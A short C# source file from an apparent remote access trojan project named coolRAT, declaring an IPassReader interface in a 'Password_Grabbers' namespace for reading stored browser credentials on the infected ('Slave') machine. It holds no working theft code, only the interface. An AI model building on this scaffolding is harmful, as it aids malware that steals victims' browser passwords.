using coolRAT.Libs.Password_Grabbers;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Slave.Password_Grabbers
{
    public interface IPassReader
    {
        IEnumerable<CredentialModel> ReadPasswords();
        string BrowserName { get; }
    }
}
